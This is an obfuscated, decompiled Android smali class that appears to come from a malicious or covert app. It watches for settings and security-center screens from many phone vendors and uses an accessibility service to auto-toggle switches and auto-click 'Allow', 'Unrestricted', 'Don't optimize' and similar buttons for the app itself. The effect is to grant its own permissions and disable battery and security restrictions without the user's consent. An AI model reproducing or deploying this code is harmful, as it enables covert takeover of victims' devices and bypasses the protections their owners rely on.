.class public abstract Lڝږ؁ڋ/ئ;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field public static ؋:J

.field public static final ؠ:Ljava/util/HashSet;

.field public static final ء:Ljava/util/HashSet;


# direct methods
.method public static constructor <clinit>()V
    .locals 24

    new-instance v0, Ljava/util/HashSet;

    const-string v1, "com.android.settings"

    const-string v2, "android"

    const-string v3, "com.miui.securitycenter"

    const-string v4, "com.miui.powerkeeper"

    const-string v5, "com.coloros.safecenter"

    const-string v6, "com.coloros.safe"

    const-string v7, "com.oppo.safe"

    const-string v8, "com.coloros.oppoguardelf"

    const-string v9, "com.vivo.permissionmanager"

    const-string v10, "com.vivo.abe"

    const-string v11, "com.iqoo.secure"

    const-string v12, "com.samsung.android.lool"

    const-string v13, "com.samsung.android.sm"

    const-string v14, "com.transsion.phonemaster"

    const-string v15, "com.transsion.phonemanager"

    const-string v16, "com.huawei.systemmanager"

    const-string v17, "com.hihonor.systemmanager"

    const-string v18, "com.asus.mobilemanager"

    const-string v19, "com.oneplus.security"

    const-string v20, "com.evenwell.powersaving.g3"

    const-string v21, "com.hmd.devicepoweroptimizer"

    const-string v22, "com.meizu.safe"

    const-string v23, "com.letv.android.letvsafe"

    filled-new-array/range {v1 .. v23}, [Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/util/HashSet;-><init>(Ljava/util/Collection;)V

    sput-object v0, Lڝږ؁ڋ/ئ;->ؠ:Ljava/util/HashSet;

    new-instance v0, Ljava/util/HashSet;

    const-string v1, "androidx.appcompat.widget.SwitchCompat"

    const-string v2, "android.widget.Switch"

    const-string v3, "android.widget.CompoundButton"

    filled-new-array {v2, v3, v1}, [Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/util/HashSet;-><init>(Ljava/util/Collection;)V

    sput-object v0, Lڝږ؁ڋ/ئ;->ء:Ljava/util/HashSet;

    return-void
.end method

.method public static ؋(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    .locals 6

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    const/4 v1, 0x0

    move v2, v1

    :goto_0
    if-ge v1, v0, :cond_3

    invoke-virtual {p0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-nez v3, :cond_0

    goto :goto_2

    :cond_0
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v4

    if-eqz v4, :cond_1

    sget-object v5, Lڝږ؁ڋ/ئ;->ء:Ljava/util/HashSet;

    invoke-interface {v4}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v5, v4}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v4

    if-nez v4, :cond_2

    const/16 v2, 0x10

    invoke-virtual {v3, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto :goto_1

    :cond_1
    invoke-static {v3}, Lڝږ؁ڋ/ئ;->؋(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v3

    if-eqz v3, :cond_2

    :goto_1
    const/4 v2, 0x1

    :cond_2
    :goto_2
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_3
    return v2
.end method

.method public static ؠ(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    .locals 7

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    const/4 v1, 0x0

    move v2, v1

    :goto_0
    if-ge v2, v0, :cond_3

    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-nez v3, :cond_0

    goto :goto_1

    :cond_0
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v4

    const/4 v5, 0x1

    if-eqz v4, :cond_1

    const-string v6, "android.widget.RadioButton"

    invoke-interface {v4}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v6, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v4

    if-nez v4, :cond_2

    const/16 p0, 0x10

    invoke-virtual {v3, p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    return v5

    :cond_1
    invoke-static {v3}, Lڝږ؁ڋ/ئ;->ؠ(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v3

    if-eqz v3, :cond_2

    return v5

    :cond_2
    :goto_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_3
    return v1
.end method

.method public static ء(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    .locals 7

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    const/4 v1, 0x0

    move v2, v1

    :goto_0
    if-ge v2, v0, :cond_3

    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-nez v3, :cond_0

    goto :goto_1

    :cond_0
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v4

    const/4 v5, 0x1

    if-eqz v4, :cond_1

    const-string v6, "android.widget.CheckBox"

    invoke-interface {v4}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v6, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v4

    if-nez v4, :cond_2

    const/16 p0, 0x10

    invoke-virtual {v3, p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    return v5

    :cond_1
    invoke-static {v3}, Lڝږ؁ڋ/ئ;->ء(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v3

    if-eqz v3, :cond_2

    return v5

    :cond_2
    :goto_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_3
    return v1
.end method

.method public static آ(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    .locals 7

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    const/4 v1, 0x0

    move v2, v1

    :goto_0
    if-ge v2, v0, :cond_3

    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-nez v3, :cond_0

    goto :goto_1

    :cond_0
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v4

    const/4 v5, 0x1

    if-eqz v4, :cond_1

    sget-object v6, Lڝږ؁ڋ/ئ;->ء:Ljava/util/HashSet;

    invoke-interface {v4}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v6, v4}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v4

    if-nez v4, :cond_2

    const/16 p0, 0x10

    invoke-virtual {v3, p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    return v5

    :cond_1
    invoke-static {v3}, Lڝږ؁ڋ/ئ;->آ(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v3

    if-eqz v3, :cond_2

    return v5

    :cond_2
    :goto_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_3
    return v1
.end method

.method public static أ(Landroid/accessibilityservice/AccessibilityService;Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 9

    if-nez p1, :cond_0

    return-void

    :cond_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object p1

    if-nez p1, :cond_1

    return-void

    :cond_1
    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    sget-object v0, Lڝږ؁ڋ/ئ;->ؠ:Ljava/util/HashSet;

    invoke-virtual {v0, p1}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    return-void

    :cond_2
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    sget-wide v2, Lڝږ؁ڋ/ئ;->؋:J

    sub-long v2, v0, v2

    const-wide/16 v4, 0x320

    cmp-long v2, v2, v4

    if-gez v2, :cond_3

    return-void

    :cond_3
    const/4 v2, 0x0

    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-object v3, v2

    :goto_0
    if-nez v3, :cond_4

    return-void

    :cond_4
    :try_start_1
    invoke-static {v3, p1}, Lڝږ؁ڋ/ئ;->إ(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result p1

    if-eqz p1, :cond_5

    sput-wide v0, Lڝږ؁ڋ/ئ;->؋:J

    return-void

    :cond_5
    invoke-static {p0, v3}, Lڝږ؁ڋ/ئ;->ؤ(Landroid/accessibilityservice/AccessibilityService;Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result p1

    if-eqz p1, :cond_6

    sput-wide v0, Lڝږ؁ڋ/ئ;->؋:J

    return-void

    :cond_6
    invoke-static {v3}, Lڝږ؁ڋ/ئ;->ؠ(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result p1

    const/4 v4, 0x1

    const/4 v5, 0x0

    if-eqz p1, :cond_7

    new-instance p1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v6

    invoke-direct {p1, v6}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v6, Lڝږ؁ڋ/آ;

    invoke-direct {v6, p0, v4}, Lڝږ؁ڋ/آ;-><init>(Landroid/accessibilityservice/AccessibilityService;I)V

    const-wide/16 v7, 0x5dc

    invoke-virtual {p1, v6, v7, v8}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    move p1, v4

    goto :goto_1

    :cond_7
    move p1, v5

    :goto_1
    if-eqz p1, :cond_8

    sput-wide v0, Lڝږ؁ڋ/ئ;->؋:J
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    return-void

    :cond_8
    :try_start_2
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object p1

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p0

    invoke-virtual {p1, p0}, Landroid/content/pm/PackageItemInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object p0

    invoke-interface {p0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_2

    :catch_1
    move-object p0, v2

    :goto_2
    if-nez p0, :cond_9

    goto :goto_5

    :cond_9
    :try_start_3
    invoke-virtual {v3, p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0

    if-eqz p0, :cond_e

    invoke-interface {p0}, Ljava/util/List;->isEmpty()Z

    move-result p1

    if-nez p1, :cond_e

    invoke-interface {p0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz p0, :cond_e

    move-object v3, p0

    move p1, v5

    :goto_3
    const/4 v6, 0x5

    if-ge p1, v6, :cond_c

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-nez v3, :cond_a

    goto :goto_4

    :cond_a
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v6

    if-le v6, v4, :cond_b

    move-object v2, v3

    goto :goto_4

    :cond_b
    add-int/lit8 p1, p1, 0x1

    goto :goto_3

    :cond_c
    :goto_4
    if-eqz v2, :cond_d

    invoke-static {v2}, Lڝږ؁ڋ/ئ;->ء(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v4

    goto :goto_6

    :cond_d
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result p1

    if-eqz p1, :cond_e

    const/16 p1, 0x10

    invoke-virtual {p0, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto :goto_6

    :cond_e
    :goto_5
    move v4, v5

    :goto_6
    if-eqz v4, :cond_f

    sput-wide v0, Lڝږ؁ڋ/ئ;->؋:J
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    return-void

    :catch_2
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_f
    return-void
.end method

.method public static ؤ(Landroid/accessibilityservice/AccessibilityService;Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    .locals 7

    const/4 v0, 0x0

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v1

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p0

    invoke-virtual {v1, p0}, Landroid/content/pm/PackageItemInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object p0

    invoke-interface {p0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-object p0, v0

    :goto_0
    const/4 v1, 0x0

    if-nez p0, :cond_0

    return v1

    :cond_0
    invoke-virtual {p1, p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0

    if-eqz p0, :cond_8

    invoke-interface {p0}, Ljava/util/List;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_8

    invoke-interface {p0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz p0, :cond_8

    move-object v3, p0

    move v2, v1

    :goto_1
    const/4 v4, 0x5

    const/4 v5, 0x1

    if-ge v2, v4, :cond_3

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-nez v3, :cond_1

    goto :goto_2

    :cond_1
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v6

    if-le v6, v5, :cond_2

    move-object v0, v3

    goto :goto_2

    :cond_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    :cond_3
    :goto_2
    if-eqz v0, :cond_4

    invoke-static {v0}, Lڝږ؁ڋ/ئ;->آ(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v2

    if-eqz v2, :cond_4

    return v5

    :cond_4
    const/16 v2, 0x10

    if-eqz v0, :cond_5

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v3

    if-eqz v3, :cond_5

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    return v5

    :cond_5
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v0

    if-eqz v0, :cond_6

    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    return v5

    :cond_6
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    :goto_3
    if-ge v1, v4, :cond_8

    if-eqz p0, :cond_8

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v0

    if-eqz v0, :cond_7

    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    return v5

    :cond_7
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    add-int/lit8 v1, v1, 0x1

    goto :goto_3

    :cond_8
    invoke-static {p1}, Lڝږ؁ڋ/ئ;->؋(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result p0

    return p0
.end method

.method public static إ(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    .locals 37

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    const-string v2, "com.android.settings"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    const/4 v3, 0x0

    if-nez v2, :cond_0

    const-string v2, "android"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    const-string v2, "com.vivo.abe"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    const-string v2, "com.vivo.permissionmanager"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    return v3

    :cond_0
    const-string v1, "android:id/button1"

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    const/4 v2, 0x1

    const/16 v4, 0x10

    if-eqz v1, :cond_1

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_1

    invoke-interface {v1, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v1, :cond_1

    invoke-virtual {v1, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    return v2

    :cond_1
    const-string v5, "\u5141\u8bb8"

    const-string v6, "Allow"

    const-string v7, "\u5141\u8a31"

    const-string v8, "\ud5c8\uc6a9"

    const-string v9, "Cho ph\u00e9p"

    const-string v10, "Izinkan"

    const-string v11, "\u0e2d\u0e19\u0e38\u0e0d\u0e32\u0e15"

    const-string v12, "Permitir"

    const-string v13, "\u4e0d\u9650\u5236"

    const-string v14, "Unrestricted"

    const-string v15, "No restrictions"

    const-string v16, "Don\'t optimize"

    const-string v17, "\u4e0d\u4f18\u5316"

    const-string v18, "\u65e0\u9650\u5236"

    const-string v19, "Never sleeping"

    const-string v20, "\u6c38\u4e0d\u4f11\u7720"

    const-string v21, "\u6dfb\u52a0"

    const-string v22, "Add"

    const-string v23, "Done"

    const-string v24, "\u5b8c\u6210"

    const-string v25, "\u786e\u5b9a"

    const-string v26, "OK"

    const-string v27, "Nunca en reposo"

    const-string v28, "Agregar"

    const-string v29, "Hecho"

    const-string v30, "Aceptar"

    const-string v31, "\u540e\u53f0\u8017\u7535\u7ba1\u7406"

    const-string v32, "Background power consumption"

    const-string v33, "High background power consumption"

    const-string v34, "\u540e\u53f0\u9ad8\u8017\u7535"

    const-string v35, "\u9ad8\u8017\u7535"

    const-string v36, "\u5f8c\u53f0\u8017\u96fb\u7ba1\u7406"

    filled-new-array/range {v5 .. v36}, [Ljava/lang/String;

    move-result-object v1

    move v5, v3

    :goto_0
    const/16 v6, 0x20

    if-ge v5, v6, :cond_5

    aget-object v6, v1, v5

    invoke-virtual {v0, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    if-eqz v6, :cond_4

    invoke-interface {v6}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :cond_2
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_4

    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v8

    if-eqz v8, :cond_3

    invoke-virtual {v7, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    return v2

    :cond_3
    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-eqz v7, :cond_2

    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v8

    if-eqz v8, :cond_2

    invoke-virtual {v7, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    return v2

    :cond_4
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    :cond_5
    return v3
.end method
